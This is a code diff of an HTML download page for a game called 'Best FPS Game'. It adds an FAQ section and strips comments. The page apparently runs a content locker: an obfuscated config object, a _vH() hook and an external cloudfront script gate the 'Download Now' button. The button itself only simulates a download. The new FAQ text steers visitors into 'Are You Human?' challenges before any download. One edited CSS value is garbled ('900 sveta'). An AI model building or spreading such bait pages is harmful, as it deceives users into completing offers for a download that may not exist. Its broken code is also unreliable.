@@ -64,13 +64,13 @@
 
         .marquee {
             display: inline-block;
-            padding-left: 100%; /* Start fully off-screen to the right */
-            animation: marquee 10s linear infinite; /* Increased duration for smoother scroll */
+            padding-left: 100%;
+            animation: marquee 8s linear infinite;
         }
 
         @keyframes marquee {
-            0% { transform: translateX(0); } /* Start at the right edge of the text */
-            100% { transform: translateX(-100%); } /* Move to the left edge of the text */
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
         }
 
         .container {
@@ -93,7 +93,7 @@
 
         .hero-content {
             text-align: center;
-            max-width: 900px;
+            max-width: 900 sveta;
             padding: 0 1rem;
         }
 
@@ -231,6 +231,54 @@
             opacity: 0.9;
         }
 
+        /* FAQ Section Styles */
+        .faq {
+            padding: 5rem 0;
+        }
+
+        .faq-heading {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            text-align: center;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 3rem;
+        }
+
+        .faq-container {
+            display: grid;
+            gap: 1.5rem;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .faq-item {
+            background: var(--card-bg);
+            padding: 1.5rem;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 221, 235, 0.2);
+            transition: transform 0.2s ease;
+        }
+
+        .faq-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .faq-question {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.2rem;
+            color: var(--neon-blue);
+            margin-bottom: 0.75rem;
+        }
+
+        .faq-answer {
+            font-size: 1rem;
+            opacity: 0.9;
+        }
+
         .footer {
             padding: 2rem 0;
             background: rgba(13, 13, 26, 0.9);
@@ -281,9 +329,13 @@
                 font-size: 1.2rem;
             }
 
-            .features {
+            .features, .faq {
                 padding: 3rem 0;
                 gap: 1.5rem;
+            }
+
+            .faq-heading {
+                font-size: 2rem;
             }
 
             .browser-notice {
@@ -358,6 +410,29 @@
                     <p class="feature-description">Squad up and dominate the battlefield</p>
                 </div>
             </section>
+
+            <!-- FAQ Section -->
+            <section class="faq" aria-labelledby="faq-heading">
+                <h2 id="faq-heading" class="faq-heading">Frequently Asked Questions</h2>
+                <div class="faq-container">
+                    <div class="faq-item">
+                        <h3 class="faq-question">How do I download Best FPS Game?</h3>
+                        <p class="faq-answer">Once you're on the website, locate the prominent "Download Now" button and click it to begin the process.</p>
+                    </div>
+                    <div class="faq-item">
+                        <h3 class="faq-question">What happens after I click "Download Now"?</h3>
+                        <p class="faq-answer">A small white box will appear with the message, "Are You Human? Let’s Find Out!" Click "Start Challenge" to proceed.</p>
+                    </div>
+                    <div class="faq-item">
+                        <h3 class="faq-question">What are the challenges?</h3>
+                        <p class="faq-answer">After pressing "Start Challenge," three different challenges will be presented. Choose one and complete it fully to verify you're not a bot.</p>
+                    </div>
+                    <div class="faq-item">
+                        <h3 class="faq-question">What happens after completing a challenge?</h3>
+                        <p class="faq-answer">Once you finish the challenge, you'll be redirected to a new page where you can download the game with a single click.</p>
+                    </div>
+                </div>
+            </section>
         </main>
 
         <footer class="footer">
@@ -373,7 +448,6 @@
     </div>
 
     <script>
-        // Utility function to debounce events
         const debounce = (func, wait) => {
             let timeout;
             return (...args) => {
@@ -383,7 +457,6 @@
         };
 
         document.addEventListener('DOMContentLoaded', () => {
-            // Download button handling with enhanced feedback
             const downloadBtn = document.getElementById('download-button');
             let isDownloading = false;
 
@@ -395,10 +468,9 @@
                 downloadBtn.style.transition = 'all 0.3s ease';
                 downloadBtn.style.transform = 'scale(0.95)';
                 downloadBtn.style.boxShadow = '0 0 10px rgba(0, 221, 235, 0.3)';
-                downloadBtn.style.animation = 'none'; // Stop pulse during processing
+                downloadBtn.style.animation = 'none';
                 downloadBtn.innerHTML = '<span class="fas fa-spinner fa-spin"></span> Processing...';
 
-                // Simulate download process
                 setTimeout(() => {
                     downloadBtn.style.transform = 'scale(1)';
                     downloadBtn.style.boxShadow = '0 0 20px rgba(0, 221, 235, 0.6)';
@@ -412,7 +484,6 @@
 
             downloadBtn.addEventListener('click', handleDownload);
 
-            // Lazy-loaded Intersection Observer for animations
             const observerOptions = {
                 threshold: 0.1,
                 rootMargin: '0px 0px -50px 0px'
@@ -427,9 +498,8 @@
                 });
             }, observerOptions);
 
-            document.querySelectorAll('.feature-card').forEach(card => observer.observe(card));
+            document.querySelectorAll('.feature-card, .faq-item').forEach(item => observer.observe(item));
 
-            // Enhanced particles.js configuration with performance optimization
             particlesJS('particles-js', {
                 particles: {
                     number: { 
@@ -462,7 +532,6 @@
                 retina_detect: true
             });
 
-            // Smooth scroll for better UX
             document.querySelectorAll('a[href^="#"]').forEach(anchor => {
                 anchor.addEventListener('click', (e) => {
                     e.preventDefault();
@@ -473,7 +542,6 @@
                 });
             });
 
-            // Dynamic browser notice adjustment
             const browserNotice = document.querySelector('.browser-notice');
             const updateNotice = debounce(() => {
                 if (window.innerWidth < 768) {
@@ -486,7 +554,6 @@
             window.addEventListener('resize', updateNotice);
             updateNotice();
 
-            // Performance optimization: Throttle mousemove events for particles
             let lastMove = 0;
             window.addEventListener('mousemove', throttle((e) => {
                 const now = Date.now();
@@ -495,13 +562,11 @@
                 }
             }, 100));
 
-            // Clean up on page unload
             window.addEventListener('unload', () => {
                 observer.disconnect();
             });
         });
 
-        // Throttle utility function
         function throttle(func, limit) {
             let inThrottle;
             return function(...args) {
@@ -513,7 +578,6 @@
             };
         }
 
-        // Replace the existing _vH() function from the content locker
         function _vH() {
             if (typeof window._vH === 'function') {
                 window._vH();
@@ -525,5 +589,6 @@
         var fkEuN_Oks_hjzIpc={"it":4456472,"key":"c6671"};
     </script>
     <script src="https://d2bxqnokimz7h9.cloudfront.net/7343cea.js"></script>  
+    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'924dc768492cbfaa',t:'MTc0MjczMTMzNy4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
